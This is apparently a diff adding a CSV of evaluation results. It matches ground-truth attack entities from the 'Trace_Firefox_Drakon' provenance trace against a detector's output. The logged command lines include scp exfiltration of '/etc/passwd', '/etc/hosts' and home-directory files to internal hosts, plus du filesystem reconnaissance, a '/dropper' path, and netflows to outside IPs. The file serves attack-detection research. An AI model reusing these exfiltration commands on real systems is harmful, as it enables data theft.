@@ -1,0 +1,72 @@
+attack,gt_uuid,status,gt_type,gt_name,our_type,our_name,our_cmdline,type_match
+Trace_Firefox_Drakon,39f1230c-ecbf-dcff-a12d-ca98739b15f8,direct,process,/home/admin/scp scp -r /etc/passwd admin@128.55.12.110:./test/,process,scp,scp -r /etc/passwd admin@128.55.12.110:./test/,1
+Trace_Firefox_Drakon,b2021835-c0b6-98c3-b306-e9921a6d8457,direct,process,/home/admin/scp scp -r /etc/passwd admin@128.55.12.110:./test/,process,scp,scp -r /etc/passwd admin@128.55.12.110:./test/,1
+Trace_Firefox_Drakon,1c003c53-be90-6a91-c19b-7a714d44a864,direct,process,/home/admin/ssh /usr/local/bin/ssh -x -oForwardAgent=no -oPermitLocalCommand=no -oClearAllForwardings=yes -l admin -- 128.55.12.110 scp -r -t ./test/,process,ssh,/usr/local/bin/ssh -x -oForwardAgent=no -oPermitLocalCommand=no -oClearAllForwardings=yes -l admin -- 128.55.12.110 scp -r -t ./test/,1
+Trace_Firefox_Drakon,a972a4c7-d0ee-f2a7-513c-c0200e7a5569,direct,process,/home/admin/firefox firefox,process,firefox,firefox,1
+Trace_Firefox_Drakon,3b31261a-403d-2673-940f-36da11884679,direct,process,//sshd /usr/sbin/sshd -D,process,sshd,/usr/sbin/sshd -D,1
+Trace_Firefox_Drakon,4e2d8224-3667-4b3a-ec43-8abea4788498,direct,process,/home/admin/firefox firefox,process,firefox,firefox,1
+Trace_Firefox_Drakon,e6121325-5c30-5a6f-3916-6e7778795123,direct,netflow,128.55.12.118:52012->35.106.122.76:80,netflow,128.55.12.118:52012->35.106.122.76:80,,1
+Trace_Firefox_Drakon,2b7ab6a4-71f3-be5f-e654-b797622837b3,direct,netflow,128.55.12.118:39746->69.155.209.87:80,netflow,128.55.12.118:39746->69.155.209.87:80,,1
+Trace_Firefox_Drakon,596e9a1f-6548-796c-2c61-654959591ac2,direct,process,/home/admin/firefox firefox,process,firefox,firefox,1
+Trace_Firefox_Drakon,ba54635f-da78-73da-ae1e-32b8089d7af3,direct,file,/usr/local/firefox-54.0.1/build/win32/crashinjectdll,file,/usr/local/firefox-54.0.1/build/win32/crashinjectdll,,1
+Trace_Firefox_Drakon,9a823242-2e50-628a-99e9-c2fb259cdabb,direct,process,//sshd /usr/sbin/sshd -D,process,sshd,/usr/sbin/sshd -D,1
+Trace_Firefox_Drakon,488431d8-4681-7f12-2d3f-28ab91458ec8,direct,process,/home/admin/du du -sh /bin /boot /data /dev /etc /home /initrd.img /lib /lib64 /lost+found /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var /vmlinuz,process,du,du -sh /bin /boot /data /dev /etc /home /initrd.img /lib /lib64 /lost+found /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var /vmlinuz,1
+Trace_Firefox_Drakon,ea4d57e8-f915-1b73-7d9b-4131d34d291b,direct,file,/usr/local/firefox-54.0.1/build/win32/crashinjectdll,file,/usr/local/firefox-54.0.1/build/win32/crashinjectdll,,1
+Trace_Firefox_Drakon,f67904fc-9a90-0a57-8537-2eff8cc004ad,direct,file,/home/admin/test,file,/home/admin/test,,1
+Trace_Firefox_Drakon,ee233911-a400-5c63-33c9-e7bb3d7a6749,direct,file,/home/admin/test/My Pictures,file,/home/admin/test/My Pictures,,1
+Trace_Firefox_Drakon,56b706fc-4343-63e9-8897-f3a6751c706c,direct,file,/etc/ld.so.cache,file,/etc/ld.so.cache,,1
+Trace_Firefox_Drakon,40e12389-0424-2cbf-98aa-c5deed9bbbb0,direct,file,/home/admin/test/My Pictures/Camera Roll,file,/home/admin/test/My Pictures/Camera Roll,,1
+Trace_Firefox_Drakon,bfd4b954-30e5-efcc-2e53-506e5adc973b,direct,file,/home/admin/test/My Pictures/Saved Pictures,file,/home/admin/test/My Pictures/Saved Pictures,,1
+Trace_Firefox_Drakon,26ac660c-4a00-87c9-b50a-da0ae25a93d4,direct,file,/home/admin/test/My Videos,file,/home/admin/test/My Videos,,1
+Trace_Firefox_Drakon,2e4cbd68-c4b9-1f59-5346-d4e4eab00283,direct,file,/home/admin/test/My Music,file,/home/admin/test/My Music,,1
+Trace_Firefox_Drakon,9568054b-2e6e-7a19-6177-91206a25d2c4,direct,process,//sshd /usr/sbin/sshd -D,process,sshd,/usr/sbin/sshd -D,1
+Trace_Firefox_Drakon,f2b401c4-aa27-d332-2882-471649f07aaa,direct,file,/usr/local/firefox-54.0.1/toolkit/crashreporter/injector,file,/usr/local/firefox-54.0.1/toolkit/crashreporter/injector,,1
+Trace_Firefox_Drakon,dddc40ee-f4b8-1a94-a966-bd9035a9891b,direct,process,/home/admin/du du -sh /bin /boot /data /dev /dropper /etc /home /initrd.img /lib /lib64 /lost+found /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var /vmlinuz,process,du,du -sh /bin /boot /data /dev /dropper /etc /home /initrd.img /lib /lib64 /lost+found /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var /vmlinuz,1
+Trace_Firefox_Drakon,29316f1c-1c2a-ea8f-00bc-104bd0a414a0,direct,process,/home/admin/firefox firefox,process,firefox,firefox,1
+Trace_Firefox_Drakon,669b2a0f-1a3c-ab31-bf48-ee64493b5f5f,direct,process,/home/admin/du du -sh /bin /boot /data /dev /dropper /etc /home /initrd.img /lib /lib64 /lost+found /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var /vmlinuz,process,du,du -sh /bin /boot /data /dev /dropper /etc /home /initrd.img /lib /lib64 /lost+found /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var /vmlinuz,1
+Trace_Firefox_Drakon,98c05e9a-72b6-9abf-d46c-d0e1fe301d26,direct,process,//sshd /usr/sbin/sshd -D -R,process,sshd,/usr/sbin/sshd -D -R,1
+Trace_Firefox_Drakon,9ab9d185-f600-39f7-9f36-8f5a9c48f6a0,direct,process,/home/admin/bash bash -c scp -r -t ./test/,process,bash,bash -c scp -r -t ./test/,1
+Trace_Firefox_Drakon,c8910621-09cf-5ed5-6d41-f486705b5d0a,direct,process,/home/admin/scp scp -r -t ./test/,process,scp,scp -r -t ./test/,1
+Trace_Firefox_Drakon,3c24f192-35cd-7bbe-524b-d6e4a98d73e6,direct,file,/usr/src/linux-headers-4.4.0-31/zfs/cmd/zinject,file,/usr/src/linux-headers-4.4.0-31/zfs/cmd/zinject,,1
+Trace_Firefox_Drakon,61d3c674-ddb8-9cce-dcf2-da9bd89d190b,direct,process,//sshd /usr/sbin/sshd -D,process,sshd,/usr/sbin/sshd -D,1
+Trace_Firefox_Drakon,1b0f5856-9986-809d-67e2-4069610d0635,direct,file,/proc,file,/proc,,1
+Trace_Firefox_Drakon,3530a93e-5a15-a52e-4928-c711c05eb591,direct,file,/usr/src/linux-headers-4.4.0-31/zfs/cmd/zinject,file,/usr/src/linux-headers-4.4.0-31/zfs/cmd/zinject,,1
+Trace_Firefox_Drakon,96202343-065c-0550-72ba-bb9b6aefb5aa,direct,file,/usr/src/linux-headers-4.4.0-31/tools/testing/fault-injection,file,/usr/src/linux-headers-4.4.0-31/tools/testing/fault-injection,,1
+Trace_Firefox_Drakon,b39e0bfa-894e-2310-8057-8cc0b5920e0d,direct,process,//sshd /usr/sbin/sshd -D -R,process,sshd,/usr/sbin/sshd -D -R,1
+Trace_Firefox_Drakon,72323cce-95dc-29c4-84f5-4acebf0f2fcd,direct,file,/etc/passwd,file,/etc/passwd,,1
+Trace_Firefox_Drakon,e8680c51-02e7-55ce-1dd0-75832ec6444a,direct,process,/home/admin/firefox firefox,process,firefox,firefox,1
+Trace_Firefox_Drakon,836e0de2-95a1-c708-ee95-90e6b42d346e,direct,process,/home/admin/firefox firefox,process,firefox,firefox,1
+Trace_Firefox_Drakon,4632a444-526b-0848-697f-574905c7d376,direct,process,/home/admin/firefox firefox,process,firefox,firefox,1
+Trace_Firefox_Drakon,def8fc47-7a9a-fbed-6b2a-08b2189beccd,direct,process,//sshd /usr/sbin/sshd -D,process,sshd,/usr/sbin/sshd -D,1
+Trace_Firefox_Drakon,5b0de31c-78e1-9384-434e-75217c652adc,direct,file,/usr/local/firefox-54.0.1/build/unix/elfhack/inject,file,/usr/local/firefox-54.0.1/build/unix/elfhack/inject,,1
+Trace_Firefox_Drakon,9fdf1b5e-f3bf-f64e-5d8e-4419dd0429a1,direct,process,/home/admin/scp scp -r /etc/hosts admin@128.55.12.118:./test/,process,scp,scp -r /etc/hosts admin@128.55.12.118:./test/,1
+Trace_Firefox_Drakon,16ae4ded-2491-e230-2ccb-2218e8441f79,direct,process,/home/admin/scp scp -r /etc/hosts admin@128.55.12.118:./test/,process,scp,scp -r /etc/hosts admin@128.55.12.118:./test/,1
+Trace_Firefox_Drakon,29fb5a5f-076a-87b9-52b2-b5eae2bb4182,direct,process,/home/admin/ssh /usr/local/bin/ssh -x -oForwardAgent=no -oPermitLocalCommand=no -oClearAllForwardings=yes -l admin -- 128.55.12.118 scp -r -t ./test/,process,ssh,/usr/local/bin/ssh -x -oForwardAgent=no -oPermitLocalCommand=no -oClearAllForwardings=yes -l admin -- 128.55.12.118 scp -r -t ./test/,1
+Trace_Firefox_Drakon,54e27d76-250b-fc64-0c78-a6224e36cd24,direct,process,/home/admin/firefox firefox,process,firefox,firefox,1
+Trace_Firefox_Drakon,bf400076-1be9-a755-7f6d-e7de1c5c5fcf,direct,process,/home/admin/firefox firefox,process,firefox,firefox,1
+Trace_Firefox_Drakon,f65bc9ca-8365-9ee4-e1ba-cb24ef56c3a1,direct,file,/usr/src/linux-headers-4.4.0-31/tools/testing/fault-injection,file,/usr/src/linux-headers-4.4.0-31/tools/testing/fault-injection,,1
+Trace_Firefox_Drakon,5641710a-6de3-d0f1-650f-4e25b8068331,direct,file,/usr/local/firefox-54.0.1/build/win32/crashinjectdll,file,/usr/local/firefox-54.0.1/build/win32/crashinjectdll,,1
+Trace_Firefox_Drakon,08ecebd8-ccb3-6dc8-59a3-fe4ade88740b,direct,file,/usr/local/build/unix/elfhack/inject,file,/usr/local/build/unix/elfhack/inject,,1
+Trace_Firefox_Drakon,29ab8369-ee84-120e-6ded-0b970c464c4f,direct,netflow,128.55.12.118:53368->35.106.122.76:80,netflow,128.55.12.118:53368->35.106.122.76:80,,1
+Trace_Firefox_Drakon,3cc73db2-7d4c-4671-fa22-94708beecc83,direct,file,/home/admin/test,file,/home/admin/test,,1
+Trace_Firefox_Drakon,93afb68d-bf75-d4fc-532a-03cb143a936c,direct,netflow,128.55.12.118:41102->69.155.209.87:80,netflow,128.55.12.118:41102->69.155.209.87:80,,1
+Trace_Firefox_Drakon,d2e62775-fde8-fcb3-128e-4fd5f792959e,direct,process,//sshd /usr/sbin/sshd -D -R,process,sshd,/usr/sbin/sshd -D -R,1
+Trace_Firefox_Drakon,a745301d-3a70-6bb2-47d2-0f65b2f1361a,direct,process,/home/admin/bash bash -c scp -r -t ./test/,process,bash,bash -c scp -r -t ./test/,1
+Trace_Firefox_Drakon,ed09a580-51b7-b573-f733-bfc47ae9473f,direct,process,/home/admin/scp scp -r -t ./test/,process,scp,scp -r -t ./test/,1
+Trace_Firefox_Drakon,0a685369-24ff-da92-415e-e18fea06d7e2,direct,file,/etc/passwd,file,/etc/passwd,,1
+Trace_Firefox_Drakon,a1d32242-5f11-f358-ed81-9b9f648b7b3c,direct,process,/home/admin/du du -sh /bin /boot /data /dev /etc /home /initrd.img /lib /lib64 /lost+found /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var /vmlinuz,process,du,du -sh /bin /boot /data /dev /etc /home /initrd.img /lib /lib64 /lost+found /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var /vmlinuz,1
+Trace_Firefox_Drakon,d130da2c-4151-6de6-8fcb-e9e381bce566,direct,process,/home/admin/du du -sh /bin /boot /data /dev /etc /home /initrd.img /lib /lib64 /lost+found /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var /vmlinuz,process,du,du -sh /bin /boot /data /dev /etc /home /initrd.img /lib /lib64 /lost+found /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var /vmlinuz,1
+Trace_Firefox_Drakon,1b08ff38-2e61-98a1-d40f-92359984cbbb,direct,process,/home/admin/ssh /usr/local/bin/ssh -x -oForwardAgent=no -oPermitLocalCommand=no -oClearAllForwardings=yes -l admin -- 128.55.12.51 scp -r -d -t ./test/,process,ssh,/usr/local/bin/ssh -x -oForwardAgent=no -oPermitLocalCommand=no -oClearAllForwardings=yes -l admin -- 128.55.12.51 scp -r -d -t ./test/,1
+Trace_Firefox_Drakon,b6a4a311-a5ce-596c-77e3-251df9216d14,direct,process,//sshd /usr/sbin/sshd -D -R,process,sshd,/usr/sbin/sshd -D -R,1
+Trace_Firefox_Drakon,716ec408-301f-61d6-7878-bd48739602a9,direct,process,/home/admin/bash bash -c scp -r -t ./test/,process,bash,bash -c scp -r -t ./test/,1
+Trace_Firefox_Drakon,4370a284-f70c-7cc2-2af5-5be66098af84,direct,process,/home/admin/scp scp -r /home/admin/acrylic /home/admin/adjuncts /home/admin/aethogen /home/admin/airbrush /home/admin/allayers /home/admin/allround /home/admin/anconeus /home/admin/ancylostomiasis /home/admin/antilepton /home/admin/antisepticize /home/admin/autocombustible /home/admin/aviarists /hom,process,scp,scp -r /home/admin/acrylic /home/admin/adjuncts /home/admin/aethogen /home/admin/airbrush /home/admin/allayers /home/admin/allround /home/admin/anconeus /home/admin/ancylostomiasis /home/admin/antilepton /home/admin/antisepticize /home/admin/autocombustible /home/admin/aviarists /home/admin/backup /,1
+Trace_Firefox_Drakon,4ebf07bc-fdbb-6ba6-6414-32e5bb854040,direct,process,/home/admin/scp scp -r /home/admin/acrylic /home/admin/adjuncts /home/admin/aethogen /home/admin/airbrush /home/admin/allayers /home/admin/allround /home/admin/anconeus /home/admin/ancylostomiasis /home/admin/antilepton /home/admin/antisepticize /home/admin/autocombustible /home/admin/aviarists /hom,process,scp,scp -r /home/admin/acrylic /home/admin/adjuncts /home/admin/aethogen /home/admin/airbrush /home/admin/allayers /home/admin/allround /home/admin/anconeus /home/admin/ancylostomiasis /home/admin/antilepton /home/admin/antisepticize /home/admin/autocombustible /home/admin/aviarists /home/admin/backup /,1
+Trace_Firefox_Drakon,8436cc10-fe54-163c-4687-70ebde1b47f0,direct,file,/usr/local/firefox-54.0.1/build/unix/elfhack/inject,file,/usr/local/firefox-54.0.1/build/unix/elfhack/inject,,1
+Trace_Firefox_Drakon,25c809eb-6472-ed01-6f1a-baf31375d288,direct,process,/home/admin/scp scp -r -t ./test/,process,scp,scp -r -t ./test/,1
+Trace_Firefox_Drakon,5be2001e-94d8-56d7-a4a7-1df5cbbf3750,direct,file,/usr/local/firefox-54.0.1/build/unix/elfhack/inject,file,/usr/local/firefox-54.0.1/build/unix/elfhack/inject,,1
+Trace_Firefox_Drakon,b8cc6df4-c59a-d065-a79f-fca8a091fee9,direct,file,/usr/local/build/win32/crashinjectdll,file,/usr/local/build/win32/crashinjectdll,,1
+Trace_Firefox_Drakon,b2f51570-3e4a-66b2-ef37-15efeaa2b73e,direct,file,/usr/local/firefox-54.0.1/toolkit/crashreporter/injector,file,/usr/local/firefox-54.0.1/toolkit/crashreporter/injector,,1
+Trace_Firefox_Drakon,d2f13844-41e7-a788-ee2e-76a81cf4af8a,direct,file,/usr/local/firefox-54.0.1/toolkit/crashreporter/injector,file,/usr/local/firefox-54.0.1/toolkit/crashreporter/injector,,1
+Trace_Firefox_Drakon,68c0ed0e-d3e2-765d-54a8-9e7f16355095,MISS,file,/dev/null,,,,0
+Trace_Firefox_Drakon,5165bcdd-fa7b-9008-c5b2-792825f594f7,MISS,file,/dev/urandom,,,,0
+Trace_Firefox_Drakon,6c7a9e96-e2a1-1287-df73-183f0ee5b82d,MISS,process,/home/admin/firefox firefox,,,,0
